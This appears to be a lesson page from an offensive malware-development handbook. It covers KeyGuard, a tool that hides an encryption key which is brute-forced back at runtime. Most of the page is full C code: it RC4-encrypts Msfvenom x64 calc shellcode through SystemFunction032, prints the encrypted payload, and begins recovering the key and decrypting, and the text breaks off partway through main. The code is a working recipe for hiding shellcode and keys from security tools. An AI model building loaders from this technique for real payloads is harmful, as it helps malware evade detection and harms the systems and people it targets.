@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Research Tool: KeyGuard</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="research-tool-keyguard" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="sparkles" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)] flex-shrink-0"></i>
+                <span>Research Tool: KeyGuard</span>
+            </h2>
+            <a href="#research-tool-keyguard" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This module demonstrates a Offensive Engineering Handbook tool that generates an encryption key, encrypts it, and outputs the source code needed to brute force it at runtime.</p><h3 id="usage" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Usage</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The tool only requires the key size in bytes.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">##########################################################
+                        # KeyGuard - Designed By Offensive Engineering Handbook @NUL0x4C | @mrd0x #
+                        ##########################################################
+
+[!] Require Input Key Size To Run</code></pre>
+        </div><h3 id="examples" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Examples</span></h3><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">.\KeyGuard.exe 32</code> - Generates a 32-byte encrypted key, with a brute forcing function to decrypt it at runtime</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">.\KeyGuard.exe 16</code> - Generates a 16-byte encrypted key, with a brute forcing function to decrypt it at runtime</span></div><h3 id="keyguard-demo" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>KeyGuard Demo</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The image below shows <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">KeyGuard</code> being used to generate a 32-byte encrypted key.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/keyguard-116004022-69d0f001-ad32-4fd2-aec8-669c50c3d93d.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">he complete output is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">/*
+
+[i] Input Key Size : 32
+[+] Using &quot;0x88&quot; As A Hint Byte
+
+[+] Use The Following Key For [Encryption]
+unsigned char OriginalKey[] = {
+        0x88, 0xAE, 0x23, 0xCD, 0x24, 0xD0, 0xA5, 0xC9, 0xE7, 0x9C, 0x3C, 0x53, 0x9B, 0xCE, 0x01, 0x30,
+        0xBC, 0x7A, 0x0A, 0x2F, 0xB3, 0xFE, 0x8E, 0xBA, 0x0F, 0x34, 0x49, 0xAB, 0x12, 0xEC, 0x22, 0x61 };
+
+[+] Use The Following For [Implementations]
+unsigned char ProtectedKey[] = {
+        0xD1, 0xF6, 0x7C, 0x89, 0x71, 0x8C, 0xF2, 0x89, 0xB6, 0xFC, 0x1F, 0x07, 0xFE, 0x82, 0x56, 0x66,
+        0x95, 0xD2, 0x45, 0x1B, 0x9E, 0x4A, 0xFD, 0x88, 0x7E, 0x14, 0x3A, 0x9F, 0x77, 0x50, 0x19, 0xD9 };
+
+
+
+                        -------------------------------------------------
+
+*/
+
+#include &lt;Windows.h&gt;#define HINT_BYTE 0x88unsigned char ProtectedKey[] = {
+        0xD1, 0xF6, 0x7C, 0x89, 0x71, 0x8C, 0xF2, 0x89, 0xB6, 0xFC, 0x1F, 0x07, 0xFE, 0x82, 0x56, 0x66,
+        0x95, 0xD2, 0x45, 0x1B, 0x9E, 0x4A, 0xFD, 0x88, 0x7E, 0x14, 0x3A, 0x9F, 0x77, 0x50, 0x19, 0xD9 };
+
+BYTE BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {
+
+        BYTE            b                       = 0;
+        INT             i                       = 0;
+        PBYTE           pRealKey                = (PBYTE)malloc(sKey);
+
+        if (!pRealKey)
+             return NULL;
+
+        while (1){
+
+                if (((pProtectedKey[0] ^ b)) == HintByte)
+                     break;
+                else
+                     b++;
+
+        }
+
+        for (int i = 0; i &lt; sKey; i++){
+                pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
+        }
+
+        *ppRealKey = pRealKey;
+        return b;
+}
+
+// Example calling:
+
+// PBYTE        pRealKey        =       NULL;
+// BruteForceDecryption(HINT_BYTE, ProtectedKey, sizeof(ProtectedKey), &amp;pRealKey);</code></pre>
+        </div><h3 id="example-rc4-encryption" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Example - RC4 Encryption</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To encrypt a payload, the plaintext key is the one used. Based on the output shown above, the plaintext key is the following:</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">unsigned char OriginalKey[] = {
+        0x88, 0xAE, 0x23, 0xCD, 0x24, 0xD0, 0xA5, 0xC9, 0xE7, 0x9C, 0x3C, 0x53, 0x9B, 0xCE, 0x01, 0x30,
+        0xBC, 0x7A, 0x0A, 0x2F, 0xB3, 0xFE, 0x8E, 0xBA, 0x0F, 0x34, 0x49, 0xAB, 0x12, 0xEC, 0x22, 0x61 };</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the key that must be used to encrypt a payload. The encryption process will use the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Rc4EncryptionViSystemFunc032</code> function to encrypt the Msfvenom x64 calc shellcode with the key. Recall this process from the <em>Payload Encryption - RC4</em> module.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// x64 calc metasploit (to encrypt)
+unsigned char Payload[] = {
+	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+};
+
+
+
+// The following code is from (RC4 payload encryption - basic module)
+
+// This is what SystemFunction032 function take as a parameter
+typedef struct
+{
+	DWORD	Length;
+	DWORD	MaximumLength;
+	PVOID	Buffer;
+
+} USTRING;
+
+
+// Defining how does the function look - more on this structure in the api hashing part
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(
+	struct USTRING* Data,
+	struct USTRING* Key
+	);
+
+
+BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+	// The return of SystemFunction032
+	NTSTATUS	STATUS = NULL;
+
+	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
+	USTRING		Key  = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
+		        Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };
+
+
+	// Since SystemFunction032 is exported from Advapi32.dll, we use LoadLibraryA to load Advapi32.dll into the prcess,
+	// and using its return as the hModule parameter in GetProcAddress
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);
+
+	// If SystemFunction032 calls failed it will return non zero value
+	if ((STATUS = SystemFunction032(&amp;Data, &amp;Key)) != 0x0) {
+		printf(&quot;[!] SystemFunction032 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+
+
+// Print data as hex arrays - C style
+VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
+
+	printf(&quot;unsigned char %s[] = {&quot;, Name);
+
+	for (int i = 0; i &lt; Size; i++) {
+		if (i % 16 == 0) {
+			printf(&quot;\n\t&quot;);
+		}
+		if (i &lt; Size - 1) {
+			printf(&quot;0x%0.2X, &quot;, Data[i]);
+		}
+		else {
+			printf(&quot;0x%0.2X &quot;, Data[i]);
+		}
+	}
+
+	printf(&quot;};\n\n&quot;);
+
+}
+
+// The plaintext key - generated by keguard
+unsigned char OriginalKey[] = {
+		0x88, 0xAE, 0x23, 0xCD, 0x24, 0xD0, 0xA5, 0xC9, 0xE7, 0x9C, 0x3C, 0x53, 0x9B, 0xCE, 0x01, 0x30,
+		0xBC, 0x7A, 0x0A, 0x2F, 0xB3, 0xFE, 0x8E, 0xBA, 0x0F, 0x34, 0x49, 0xAB, 0x12, 0xEC, 0x22, 0x61 };
+
+
+int main() {
+
+	if (!Rc4EncryptionViSystemFunc032(OriginalKey, Payload, sizeof(OriginalKey), sizeof(Payload))) {
+		return -1;
+	}
+
+	PrintHexData(&quot;Rc4EncryptedPayload&quot;, Payload, sizeof(Payload));
+
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
+	getchar();
+
+	return 0;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The output is shown in the image below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/keyguard-216006045-84544960-079a-4c5c-9ac0-c4e31ba80dbc.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="example-rc4-decryption" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Example - RC4 Decryption</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The code below will decrypt the RC4 encrypted payload using the brute force method. The key is encrypted using the KeyGuard tool.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// Encrypted x64 calc metasploit shellcode
+unsigned char Rc4EncryptedPayload[] = {
+        0x44, 0x3C, 0x18, 0x73, 0xCA, 0x86, 0x68, 0x08, 0xBC, 0xCD, 0x2D, 0x59, 0x39, 0x22, 0x3C, 0xFF,
+        0x6A, 0x87, 0xA0, 0xF9, 0x69, 0xB4, 0x49, 0x95, 0x3A, 0xF7, 0x79, 0x24, 0x57, 0x7D, 0xC6, 0x31,
+        0xD1, 0xB4, 0x68, 0xC7, 0x5D, 0x88, 0xFF, 0x90, 0x2C, 0x1A, 0xB3, 0xB3, 0xB3, 0xD5, 0x8E, 0xD0,
+        0x31, 0x8C, 0x11, 0x1E, 0x51, 0x12, 0xC6, 0x32, 0x27, 0x8F, 0x34, 0x56, 0x49, 0x15, 0xBE, 0xE9,
+        0xDB, 0xA9, 0xD7, 0x44, 0x66, 0x87, 0x79, 0x07, 0x94, 0x04, 0xB0, 0x74, 0x96, 0x4A, 0x09, 0x3B,
+        0xAA, 0xBF, 0xEE, 0x0D, 0xEC, 0x2D, 0x6B, 0xD9, 0x01, 0xCE, 0xBE, 0x4D, 0xA9, 0x3C, 0x78, 0x93,
+        0x62, 0xFE, 0x5E, 0x69, 0x47, 0x54, 0xAE, 0xD1, 0x0F, 0xC3, 0xAF, 0xA6, 0xE8, 0xF2, 0xFA, 0x02,
+        0x08, 0xD8, 0xDA, 0x42, 0xD7, 0x62, 0x31, 0xC8, 0x1E, 0x5E, 0x11, 0x2A, 0xB0, 0x82, 0xB5, 0x0B,
+        0x15, 0xC3, 0x36, 0xD2, 0x36, 0xA8, 0x1B, 0x88, 0x2C, 0x3F, 0x4D, 0xDE, 0x5F, 0x19, 0x17, 0xF6,
+        0xE8, 0x30, 0x16, 0x6C, 0x64, 0x7B, 0x5E, 0xD4, 0x45, 0x93, 0x76, 0x47, 0x86, 0xE2, 0x19, 0xEA,
+        0x62, 0x64, 0x17, 0xBE, 0x0A, 0x0D, 0x66, 0xF9, 0x3A, 0xB7, 0xD0, 0xFD, 0xE4, 0x90, 0xA5, 0xB1,
+        0x04, 0xAD, 0x6E, 0x9E, 0xA6, 0x81, 0xFC, 0xBA, 0x08, 0x30, 0x56, 0x86, 0x34, 0xC3, 0xE6, 0x2D,
+        0xA3, 0x90, 0x93, 0x13, 0xD7, 0xD3, 0x7D, 0x0C, 0xCB, 0x6F, 0xA4, 0xE0, 0xAA, 0x19, 0x77, 0x4F,
+        0xB6, 0x2A, 0xEA, 0xA0, 0xDD, 0x0C, 0x57, 0x1F, 0x93, 0x08, 0x0D, 0x1B, 0x29, 0x79, 0x62, 0x00,
+        0xCC, 0xE3, 0x6B, 0xF2, 0xD6, 0x71, 0xC6, 0x80, 0x0A, 0x4B, 0x68, 0xD1, 0xBA, 0xDC, 0x86, 0x8D,
+        0x3C, 0x6E, 0xAA, 0xAC, 0xBE, 0x3E, 0x66, 0xD9, 0x2E, 0x94, 0x8C, 0x71, 0x00, 0x94, 0x13, 0xE2,
+        0xCC, 0xDF, 0x98, 0x32, 0xD7, 0x9D, 0x5B, 0xAD, 0xFB, 0x21, 0x6A, 0xF4, 0x88, 0x16, 0x0B, 0xEF };
+
+
+// The following code is from (RC4 payload encryption - basic module)
+
+// This is what SystemFunction032 function take as a parameter
+typedef struct
+{
+	DWORD	Length;
+	DWORD	MaximumLength;
+	PVOID	Buffer;
+
+} USTRING;
+
+
+// Defining how does the function look - more on this structure in the api hashing part
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(
+	struct USTRING* Data,
+	struct USTRING* Key
+	);
+
+
+BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+	// The return of SystemFunction032
+	NTSTATUS	STATUS = NULL;
+
+	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
+	USTRING		Key  = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
+		        Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };
+
+
+	// Since SystemFunction032 is exported from Advapi32.dll, we use LoadLibraryA to load Advapi32.dll into the prcess,
+	// And using its return as the hModule parameter in GetProcAddress
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);
+
+	// If SystemFunction032 calls failed it will return non zero value
+	if ((STATUS = SystemFunction032(&amp;Data, &amp;Key)) != 0x0) {
+		printf(&quot;[!] SystemFunction032 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+
+// The following code is from keyguard tool
+
+
+#define HINT_BYTE 0x88// The encrypted key - generated by keguard
+unsigned char ProtectedKey[] = {
+        0xD1, 0xF6, 0x7C, 0x89, 0x71, 0x8C, 0xF2, 0x89, 0xB6, 0xFC, 0x1F, 0x07, 0xFE, 0x82, 0x56, 0x66,
+        0x95, 0xD2, 0x45, 0x1B, 0x9E, 0x4A, 0xFD, 0x88, 0x7E, 0x14, 0x3A, 0x9F, 0x77, 0x50, 0x19, 0xD9 };
+
+BYTE BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {
+
+    BYTE            b = 0;
+    INT             i = 0;
+    PBYTE           pRealKey = (PBYTE)malloc(sKey);
+
+    if (!pRealKey)
+        return NULL;
+
+    while (1) {
+
+        if (((pProtectedKey[0] ^ b) - i) == HintByte)
+            break;
+        else
+            b++;
+    }
+
+    for (int i = 0; i &lt; sKey; i++) {
+        pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
+    }
+
+    *ppRealKey = pRealKey;
+    return b;
+}
+
+VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
+
+	printf(&quot;unsigned char %s[] = {&quot;, Name);
+
+	for (int i = 0; i &lt; Size; i++) {
+		if (i % 16 == 0) {
+			printf(&quot;\n\t&quot;);
+		}
+		if (i &lt; Size - 1) {
+			printf(&quot;0x%0.2X, &quot;, Data[i]);
+		}
+		else {
+			printf(&quot;0x%0.2X &quot;, Data[i]);
+		}
+	}
+
+	printf(&quot;};\n\n&quot;);
+
+}
+
+
+int main() {
+
+
+
+    // Code from keyguard
+    PBYTE        pRealKey        =       NULL;
+    if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, sizeof(ProtectedKey), &amp;pRealKey)) {
+        return -1;
+    }
+
+    // Printing keyguard brute forced key
+    PrintHexData(&quot;OriginalKey&quot;, pRealKey, sizeof(ProtectedKey));
+
+    // Decrypting with the original key
